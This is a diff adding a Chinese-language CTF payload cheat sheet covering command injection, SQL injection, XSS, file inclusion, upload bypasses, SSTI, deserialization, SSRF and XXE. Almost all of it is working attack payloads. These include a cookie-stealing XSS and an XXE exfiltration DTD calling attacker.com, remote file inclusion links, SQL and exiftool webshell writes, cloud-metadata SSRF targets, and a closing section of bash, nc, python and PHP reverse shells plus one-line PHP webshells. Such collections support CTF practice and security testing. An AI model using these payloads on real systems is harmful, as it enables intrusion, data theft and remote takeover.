@@ -1,0 +1,209 @@
+CTF常用Payload启动文档
+1. 命令注入 (Command Injection)
+适用场景：ping、traceroute、nslookup等执行系统命令的功能点。
+
+Payload	说明
+; id	分号分隔执行
+| id	管道符执行
+|| id	前命令失败后执行
+& id	后台执行
+&& id	前命令成功后执行
+`id`	反引号命令替换
+$(id)	命令替换
+0x0a id	换行注入(需URL编码%0a)
+; cat /etc/passwd	读取文件
+; bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'	反弹shell
+127.0.0.1%0aid	换行绕过空格过滤
+;cat$IFS/etc/passwd	$IFS代替空格
+;cat</etc/passwd	重定向代替空格
+;{cat,/etc/passwd}	花括号代替空格
+;echo%09id%09|%09bash	Tab(%09)代替空格
+绕过过滤示例:
+
+空格: ${IFS}, $IFS$9, %09, <, <>
+
+关键词: ca\t, c'a't, c"a"t, cat$u, c$@at, /bin/c?t
+
+黑名单命令: 使用base64编码执行 echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
+
+2. SQL注入 (SQL Injection)
+适用场景：登录框、搜索栏、URL参数等数据库查询位置。
+
+2.1 认证绕过
+sql
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR 1=1 --
+admin' --
+admin' #
+admin'/*
+') OR ('1'='1
+')) OR (('1'='1
+2.2 UNION注入
+sql
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,@@version,3--
+' UNION SELECT 1,table_name FROM information_schema.tables--
+' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--
+2.3 布尔盲注 (条件判断)
+sql
+' AND 1=1--
+' AND 1=2--
+' AND (SELECT LENGTH(database()))=4--
+' AND SUBSTRING((SELECT database()),1,1)='t
+' AND (SELECT ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)))>100
+2.4 时间盲注
+sql
+' OR IF(1=1,SLEEP(5),0)--
+' OR IF((SELECT LENGTH(database()))=4,SLEEP(5),0)--
+'; WAITFOR DELAY '0:0:5'--          (MSSQL)
+' OR pg_sleep(5)--                   (PostgreSQL)
+' OR (SELECT 1 FROM (SELECT SLEEP(5))A)--
+2.5 报错注入
+sql
+' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
+' AND extractvalue(1,concat(0x7e,(SELECT user())))--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--
+2.6 文件读写 (MySQL)
+sql
+' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
+' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--
+3. 跨站脚本 (XSS)
+适用场景：搜索框、评论区、用户资料等展示用户输入的地方。
+
+html
+<script>alert(1)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<a href="javascript:alert(1)">click</a>
+<iframe src="javascript:alert(1)">
+<marquee onstart=alert(1)>
+<script>fetch('http://attacker.com?c='+document.cookie)</script>
+'"><script>alert(1)</script>
+'-alert(1)-'
+javascript:alert(1)
+4. 文件包含 (LFI/RFI)
+适用场景：URL参数中直接引用文件路径的情况 (?page=, ?file=)。
+
+4.1 本地文件包含 (LFI)
+text
+/etc/passwd
+../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=index.php
+php://input (POST: <?php system('id'); ?>)
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+expect://id
+/var/log/apache2/access.log     (日志包含)
+/proc/self/environ
+4.2 远程文件包含 (RFI)
+text
+http://attacker.com/shell.txt
+http://attacker.com/shell.txt? (加问号绕过后缀限制)
+ftp://attacker.com/shell.txt
+5. 文件上传绕过
+适用场景：头像上传、文件提交等。
+
+5.1 扩展名绕过
+text
+shell.php.jpg
+shell.php%00.jpg  (空字节截断)
+shell.php%20
+shell.php.
+shell.php::$DATA  (Windows)
+shell.pHp
+shell.php5, .phtml, .pht, .phar, .shtml
+shell.jpg.php
+shell.php/. (Apache解析缺陷)
+5.2 Content-Type绕过
+将 Content-Type 改为: image/jpeg, image/gif, image/png
+
+5.3 内容绕过 (图片马)
+bash
+echo '<?php system($_GET["cmd"]); ?>' >> image.jpg
+# 或使用exiftool注入
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
+6. 服务端模板注入 (SSTI)
+适用场景：用户输入被拼接到模板中渲染，如 Hello {{name}}。
+
+模板引擎	探测	命令执行
+Twig (PHP)	{{7*7}}	{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+Jinja2 (Python)	{{7*7}}	{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+Freemarker (Java)	${7*7}	${"freemarker.template.utility.Execute"?new()("id")}
+Smarty (PHP)	{7*7}	{system('id')}
+通用探测: {{7*7}}, ${7*7}, #{7*7}, {{'a'.toUpperCase()}}
+
+7. 反序列化漏洞
+适用场景：Cookie、POST数据、API参数中包含序列化对象。
+
+7.1 PHP反序列化
+text
+O:8:"StdClass":0:{}
+O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
+a:2:{i:0;s:4:"test";i:1;s:4:"test";}
+常用魔术方法利用: __destruct(), __wakeup(), __toString(), __call()
+
+7.2 Java反序列化
+常见利用链：CommonsCollections, Spring, Fastjson
+
+text
+ysoserial工具生成payload:
+java -jar ysoserial.jar CommonsCollections5 'command' | base64
+8. 服务端请求伪造 (SSRF)
+适用场景：图片远程加载、URL采集、API代理等。
+
+Payload	目的
+http://127.0.0.1:80	探测内网服务
+http://localhost:22	端口扫描
+http://169.254.169.254/latest/meta-data/	AWS元数据
+http://metadata.google.internal/	GCP元数据
+file:///etc/passwd	本地文件读取
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...	攻击Redis
+dict://127.0.0.1:6379/info	探测Redis
+http://127.0.0.1:8080/admin	访问内网管理后台
+9. XXE (XML外部实体注入)
+适用场景：XML解析且未禁用外部实体。
+
+xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+带外数据外带:
+
+xml
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
+  %xxe;
+]>
+xxe.dtd:
+
+xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
+%eval;
+%exfiltrate;
+10. 常用Shell及回连Payload
+10.1 反弹Shell（Linux）
+bash
+bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
+bash -c 'exec 5<>/dev/tcp/10.0.0.1/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'
+nc -e /bin/sh 10.0.0.1 4444
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+php -r '$s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+10.2 WebShell (PHP一行)
+php
+<?php system($_GET['cmd']); ?>
+<?php eval($_POST['x']); ?>
+<?=`$_GET[cmd]`?>
